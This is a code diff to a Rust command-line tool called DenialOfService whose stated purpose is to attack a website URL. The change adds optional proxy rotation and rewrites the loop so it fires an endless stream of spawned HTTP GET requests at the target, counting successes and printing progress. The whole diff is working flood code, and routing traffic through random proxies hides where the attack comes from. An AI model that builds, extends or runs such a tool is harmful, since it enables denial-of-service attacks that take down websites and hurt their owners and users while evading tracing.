@@ -22,11 +22,16 @@ struct Args {
     /// Website URL to attack
     #[clap(short, long)]
     url: String,
+
+    /// Path to proxy file
+    #[clap(short, long, takes_value = false)]
+    proxy: bool,
 }
 
 struct DenialOfService {
     url: String,
     spawned_requests: AtomicU128,
+    use_proxy: bool,
 }
 
 impl DenialOfService {
@@ -40,28 +45,37 @@ impl DenialOfService {
             }
         }
 
-        let mut spawned_tasks = Vec::new();
         loop {
             let self_cloned = self.clone();
 
-            let taken_proxy = take_random_proxy(proxies.clone());
-            spawned_tasks.push(tokio::spawn(async move {
-                match reqwest::Proxy::http(taken_proxy.clone()) {
-                    Ok(proxy) => match reqwest::Client::builder().proxy(proxy).build() {
-                        Ok(client) => match client.get(self_cloned.url.clone()).send().await {
-                            Ok(_) => {
-                                self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);
+            if self_cloned.use_proxy {
+                let taken_proxy = take_random_proxy(proxies.clone());
+                tokio::spawn(async move {
+                    match reqwest::Proxy::http(taken_proxy.clone()) {
+                        Ok(proxy) => match reqwest::Client::builder().proxy(proxy).build() {
+                            Ok(client) => match client.get(self_cloned.url.clone()).send().await {
+                                Ok(_) => {
+                                    self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);
 
-                                if self_cloned.spawned_requests.load(Ordering::SeqCst) % 1000 == 0 {
+                                    if self_cloned.spawned_requests.load(Ordering::SeqCst) % 1000
+                                        == 0
+                                    {
+                                        display_time();
+
+                                        let request_info = format!(
+                                            "Request №{} was successfuly sent from",
+                                            self_cloned.spawned_requests.load(Ordering::SeqCst),
+                                        );
+                                        println!("{} {}", request_info.green(), taken_proxy.bold());
+                                    }
+                                }
+                                Err(e) => {
                                     display_time();
 
-                                    let request_info = format!(
-                                        "Request №{} was successfuly sent from",
-                                        self_cloned.spawned_requests.load(Ordering::SeqCst),
-                                    );
-                                    println!("{} {}", request_info.green(), taken_proxy.bold());
+                                    let error_string = format!("{}", e);
+                                    println!("{}", error_string.red().bold());
                                 }
-                            }
+                            },
                             Err(e) => {
                                 display_time();
 
@@ -75,17 +89,34 @@ impl DenialOfService {
                             let error_string = format!("{}", e);
                             println!("{}", error_string.red().bold());
                         }
-                    },
-                    Err(e) => {
-                        display_time();
+                    };
+                });
+            } else {
+                tokio::spawn(async move {
+                    match reqwest::get(self_cloned.url.clone()).await {
+                        Ok(_) => {
+                            self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);
 
-                        let error_string = format!("{}", e);
-                        println!("{}", error_string.red().bold());
+                            if self_cloned.spawned_requests.load(Ordering::SeqCst) % 1000 == 0 {
+                                display_time();
+
+                                let request_info = format!(
+                                    "Request №{} was successfuly sent",
+                                    self_cloned.spawned_requests.load(Ordering::SeqCst),
+                                );
+                                println!("{}", request_info.green());
+                            }
+                        }
+                        Err(e) => {
+                            display_time();
+
+                            let error_string = format!("{}", e);
+                            println!("{}", error_string.red().bold());
+                        }
                     }
-                };
-            }));
+                });
+            }
         }
-        futures::future::join_all(spawned_tasks).await;
     }
 }
 
@@ -133,7 +164,10 @@ async fn website_is_up(url: String) -> Result<(), WebsiteError> {
 
 #[tokio::main]
 async fn main() {
-    let website_url = Args::parse().url;
+    let args = Args::parse();
+
+    let website_url = args.url;
+    let proxy = args.proxy;
 
     match website_is_up(website_url.clone()).await {
         Ok(()) => {
@@ -142,6 +176,7 @@ async fn main() {
             Arc::new(DenialOfService {
                 url: website_url,
                 spawned_requests: AtomicU128::new(0),
+                use_proxy: proxy,
             })
             .attack()
             .await
